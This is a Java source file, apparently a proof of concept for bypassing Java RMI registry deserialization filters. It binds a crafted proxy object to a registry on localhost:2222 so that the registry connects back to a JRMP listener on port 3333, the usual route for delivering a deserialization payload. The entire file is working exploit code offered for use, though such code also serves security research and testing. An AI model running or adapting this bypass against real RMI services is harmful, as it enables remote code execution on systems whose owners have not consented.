package rmibypass;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

public class Client {
    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException, NoSuchFieldException {
        Registry reg = LocateRegistry.getRegistry("localhost",2222); // rmi start at 2222
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333); // JRMPListener's port is 3333
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
//        Registry proxy = (Registry) Proxy.newProxyInstance(Client.class.getClassLoader(), new Class[] {
//                Registry.class
//        }, obj);


        RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                RMIServerSocketFactory.class.getClassLoader(), new Class[] {
                        RMIServerSocketFactory.class, Remote.class
                }, obj);

        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
        constructor.setAccessible(true);
        UnicastRemoteObject clz = (UnicastRemoteObject) constructor.newInstance(null);
        Field ssf = UnicastRemoteObject.class.getDeclaredField("ssf");
        ssf.setAccessible(true);
        ssf.set(clz,rmiServerSocketFactory);

        reg.bind("Hello",obj);
    }
}
